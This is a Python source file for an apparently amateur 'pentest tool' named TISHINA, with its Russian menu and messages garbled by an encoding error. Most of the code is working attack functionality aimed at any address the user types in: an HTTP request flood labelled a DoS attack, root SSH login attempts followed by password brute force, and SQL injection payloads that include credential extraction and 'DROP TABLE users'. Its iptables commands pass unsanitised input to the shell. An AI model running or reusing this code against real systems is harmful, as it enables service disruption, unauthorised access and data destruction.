import os
import socket
import concurrent.futures
import asyncio
import aiohttp
import logging
from termcolor import colored
import time
import smtplib
import socks
import requests
import paramiko
import pyfiglet

# –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
logging.basicConfig(filename='tishina.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# –û—á–∏—Å—Ç–∫–∞ —ç–∫—Ä–∞–Ω–∞
os.system('cls' if os.name == 'nt' else 'clear')

open_ports = []
attempts_per_ip = {}

password_dict_path = "posspasswords.txt"

def show_menu():
    ascii_art = pyfiglet.figlet_format("TISHINA", font="doom")

    # –ò—Å–ø–æ–ª—å–∑—É–µ–º –≥–æ–ª—É–±–æ–π —Ü–≤–µ—Ç (cyan)
    menu = (
        f"{colored(ascii_art, 'cyan')}"
        f"{colored('        pentest tool by @tisheplease', 'cyan')}"
        f"\n{colored('=============================================================', 'cyan')}"
        f"\n{colored('1. –°–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å —É—è–∑–≤–∏–º–æ—Å—Ç–∏       |  5. –†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å IP', 'cyan')}"
        f"\n{colored('2. Dos - –∞—Ç–∞–∫–∞                  |  6. –ü—Ä–æ—Å–º–æ—Ç—Ä –ª–æ–≥–æ–≤', 'cyan')}"
        f"\n{colored('3. –î–æ–±–∞–≤–∏—Ç—å IP –≤ —á–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫  |  7. –ê–Ω–æ–Ω–∏–º–Ω–∞—è —Ä–∞—Å—Å—ã–ª–∫–∞ (Tor)', 'cyan')}"
        f"\n{colored('4. –ü—Ä–æ–≤–µ—Ä–∫–∞ IP                  |  8. –ó–∞–∫—Ä—ã—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É', 'cyan')}"
        f"\n{colored('9. SQL –ò–Ω—ä–µ–∫—Ü–∏—è ', 'cyan')}"
        f"\n{colored('=============================================================', 'cyan')}"
    )
    print(menu)







def log_action(action):
    logging.info(action)


def scan_vulnerabilities():
    print(colored("–°–∫–∞–Ω–∏—Ä—É–µ–º –ø–æ—Ä—Ç—ã –Ω–∞ –ª–æ–∫–∞–ª—å–Ω–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ...", "cyan"))
    log_action("–ù–∞—á–∞—Ç–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π.")
    open_ports.clear()

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(scan_port, port) for port in range(1, 1025)]

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                open_ports.append(result)

    if open_ports:
        print(colored(f"\n–û—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã: {open_ports}", "cyan"))
        log_action(f"–û–±–Ω–∞—Ä—É–∂–µ–Ω—ã –æ—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã: {open_ports}")
        scanner_answer = input("–ó–∞–∫—Ä—ã—Ç—å —ç—Ç–∏ –ø–æ—Ä—Ç—ã? (–¥/–Ω): ")
        if scanner_answer.lower() == "–¥":
            for port in open_ports:
                block_port(port)
            print(colored("–í—Å–µ –æ—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã –∑–∞–∫—Ä—ã—Ç—ã.", "cyan"))
            log_action("–û—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã.")
        else:
            print("–ü–æ—Ä—Ç—ã –Ω–µ –±—ã–ª–∏ –∑–∞–∫—Ä—ã—Ç—ã.")
    else:
        print("–ù–µ—Ç –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤ –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ.")
        log_action("–û—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
    input("–ù–∞–∂–º–∏—Ç–µ Enter, —á—Ç–æ–±—ã –≤–µ—Ä–Ω—É—Ç—å—Å—è –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é...")


def scan_port(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex(('127.0.0.1', port))
    sock.close()
    if result == 0:
        return port
    return None


async def send_mass_requests():
    async def send_request(session, url):
        try:
            async with session.get(url) as response:
                return await response.text()
        except:
            return None

    async def main(target_url, num_requests):
        async with aiohttp.ClientSession() as session:
            tasks = [send_request(session, target_url) for _ in range(num_requests)]
            await asyncio.gather(*tasks)

    target_url = input("–í–≤–µ–¥–∏—Ç–µ URL/IP –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞: ")
    num_requests = int(input("–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤: "))
    await main(target_url, num_requests)


def block_ip():
    ip = input("–í–≤–µ–¥–∏—Ç–µ IP –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏: ")
    os.system(f'sudo iptables -A INPUT -s {ip} -j DROP')
    log_action(f"IP {ip} –¥–æ–±–∞–≤–ª–µ–Ω –≤ —á–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫.")


def check_ip():
    ip = input("–í–≤–µ–¥–∏—Ç–µ IP –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏: ")
    print(colored(f"–ü—Ä–æ–≤–µ—Ä–∫–∞ {ip}...", "cyan"))

    open_ports = []

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ—Ä—Ç—ã (1-1024)
    for port in range(1, 5000):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)

    if open_ports:
        print(colored(f"–û—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã –Ω–∞ {ip}: {open_ports}", "green"))
    else:
        print(colored("–ù–µ—Ç –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤.", "red"))

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ—Ä—Ç 22 (SSH)
    if 22 in open_ports:
        print(colored("–ü–æ—Ä—Ç 22 –æ—Ç–∫—Ä—ã—Ç! –ü—Ä–æ–±—É–µ–º –≤–æ–π—Ç–∏ –±–µ–∑ –ø–∞—Ä–æ–ª—è...", "yellow"))

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(ip, username='root', password='', timeout=3)
            print(colored("–£–¥–∞–ª–æ—Å—å –≤–æ–π—Ç–∏ –ë–ï–ó –ø–∞—Ä–æ–ª—è!", "green"))
            log_action(f"–£–¥–∞–ª–æ—Å—å –≤–æ–π—Ç–∏ –±–µ–∑ –ø–∞—Ä–æ–ª—è –Ω–∞ {ip} (SSH)")
        except paramiko.AuthenticationException:
            print(colored("–ù–µ —É–¥–∞–ª–æ—Å—å –≤–æ–π—Ç–∏ –±–µ–∑ –ø–∞—Ä–æ–ª—è. –ü—Ä–æ–±—É–µ–º –±—Ä—É—Ç—Ñ–æ—Ä—Å...", "red"))
            perform_bruteforce(ip)
        except Exception as e:
            print(colored(f"–û—à–∏–±–∫–∞: {e}", "red"))
        finally:
            ssh.close()
    else:
        print(colored("–ü–æ—Ä—Ç 22 –∑–∞–∫—Ä—ã—Ç.", "red"))

    input("–ù–∞–∂–º–∏—Ç–µ Enter, —á—Ç–æ–±—ã –≤–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é...")


def perform_bruteforce(ip):
    print(colored(f"–ù–∞—á–∏–Ω–∞–µ–º –±—Ä—É—Ç—Ñ–æ—Ä—Å SSH –Ω–∞ {ip}...", "yellow"))

    try:
        with open(password_dict_path, "r") as file:
            passwords = file.readlines()

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for password in passwords:
            password = password.strip()
            try:
                ssh.connect(ip, username='root', password=password, timeout=5)
                print(colored(f"üî• –£–°–ü–ï–®–ù–´–ô –í–•–û–î! –ü–∞—Ä–æ–ª—å: {password}", "green"))
                log_action(f"–ë—Ä—É—Ç—Ñ–æ—Ä—Å —É—Å–ø–µ—à–µ–Ω! IP: {ip}, –ø–∞—Ä–æ–ª—å: {password}")
                ssh.close()
                return  # –í—ã—Ö–æ–¥ –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –≤—Ö–æ–¥–∞
            except paramiko.AuthenticationException:
                print(colored(f"‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å: {password}", "red"))
            except Exception as e:
                print(colored(f"‚ö† –û—à–∏–±–∫–∞: {e}", "red"))

        print(colored("‚ùå –í—Å–µ –ø–∞—Ä–æ–ª–∏ –∏—Å–ø—Ä–æ–±–æ–≤–∞–Ω—ã, –¥–æ—Å—Ç—É–ø –Ω–µ –ø–æ–ª—É—á–µ–Ω.", "red"))

    except FileNotFoundError:
        print(colored(f"‚ö† –§–∞–π–ª {password_dict_path} –Ω–µ –Ω–∞–π–¥–µ–Ω!", "red"))


def unblock_ip():
    ip = input("–í–≤–µ–¥–∏—Ç–µ IP –¥–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏: ")
    os.system(f'sudo iptables -D INPUT -s {ip} -j DROP')
    log_action(f"IP {ip} —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.")


def view_logs():
    print(colored("–ü–æ—Å–ª–µ–¥–Ω–∏–µ 20 –∑–∞–ø–∏—Å–µ–π –ª–æ–≥–∞:", "cyan"))
    try:
        with open("tishina.log", "r") as file:
            lines = file.readlines()
            for line in lines[-20:]:
                print(colored(line.strip(), "cyan"))
    except FileNotFoundError:
        print("–§–∞–π–ª –ª–æ–≥–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω.")
    input("–ù–∞–∂–º–∏—Ç–µ Enter, —á—Ç–æ–±—ã –≤–µ—Ä–Ω—É—Ç—å—Å—è –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é...")


def block_port(port):
    os.system(f'sudo iptables -A INPUT -p tcp --dport {port} -j REJECT')
    log_action(f"–ü–æ—Ä—Ç {port} –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.")


def send_anonymous_email():
    tor_ip = "127.0.0.1"
    tor_port = 9050
    socks.set_default_proxy(socks.SOCKS5, tor_ip, tor_port)
    socket.socket = socks.socksocket

    from_email = input("–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π email: ")
    to_email = input("–í–≤–µ–¥–∏—Ç–µ email –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ")
    subject = input("–í–≤–µ–¥–∏—Ç–µ —Ç–µ–º—É –ø–∏—Å—å–º–∞: ")
    body = input("–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –ø–∏—Å—å–º–∞: ")

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(from_email, "your_email_password")
        message = f"Subject: {subject}\n\n{body}"
        server.sendmail(from_email, to_email, message)
        print(colored("–ü–∏—Å—å–º–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∞–Ω–æ–Ω–∏–º–Ω–æ.", "cyan"))
        log_action(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∞–Ω–æ–Ω–∏–º–Ω–æ–µ –ø–∏—Å—å–º–æ —Å {from_email} –Ω–∞ {to_email}")
    except Exception as e:
        print(colored(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–∏—Å—å–º–∞: {e}", "red"))


def sql_injection():
    url = input("–í–≤–µ–¥–∏—Ç–µ URL –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è: ")
    print("–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ SQL –∏–Ω—ä–µ–∫—Ü–∏–∏...")

    # –ü—Ä–∏–º–µ—Ä—ã —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —Ç–∏–ø–æ–≤ SQL –∏–Ω—ä–µ–∫—Ü–∏–π
    payloads = [
        "' OR 1=1 -- ",
        "' UNION SELECT NULL, username, password FROM users -- ",
        "' AND 1=1 -- ",
        "' AND 1=2 -- ",
        "' OR 'a'='a -- ",
        "'; DROP TABLE users -- "
    ]

    for payload in payloads:
        target_url = url + payload
        try:
            response = requests.get(target_url)
            if response.status_code == 200:
                print(colored(f"–£—è–∑–≤–∏–º–æ—Å—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —Å payload: {payload}", "green"))
                log_action(f"SQL –∏–Ω—ä–µ–∫—Ü–∏—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —Å payload: {payload} –Ω–∞ {url}")
            else:
                print(colored(f"–ó–∞–ø—Ä–æ—Å —Å payload: {payload} –Ω–µ –¥–∞–ª —É—è–∑–≤–∏–º–æ—Å—Ç–∏.", "red"))
        except requests.exceptions.RequestException as e:
            print(colored(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏: {e}", "red"))

    input("–ù–∞–∂–º–∏—Ç–µ Enter, —á—Ç–æ–±—ã –≤–µ—Ä–Ω—É—Ç—å—Å—è –≤ –º–µ–Ω—é...")
    os.system('cls' if os.name == 'nt' else 'clear')


async def main_program():
    while True:
        show_menu()
        choice = input(colored("–í—ã–±–µ—Ä–∏—Ç–µ –æ–ø—Ü–∏—é: ", "cyan"))
        if choice == "1":
            scan_vulnerabilities()
        elif choice == "2":
            await send_mass_requests()
        elif choice == "3":
            block_ip()
        elif choice == "4":
            check_ip()
        elif choice == "5":
            unblock_ip()
        elif choice == "6":
            view_logs()
        elif choice == "7":
            send_anonymous_email()
        elif choice == "8":
            log_action("–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º.")
            print("–ó–∞–∫—Ä—ã—Ç–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è...")
            break
        elif choice == "9":
            sql_injection()
        else:
            input("–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è –æ–ø—Ü–∏—è. –ù–∞–∂–º–∏—Ç–µ Enter, —á—Ç–æ–±—ã –≤–µ—Ä–Ω—É—Ç—å—Å—è.")


if __name__ == "__main__":
    asyncio.run(main_program())
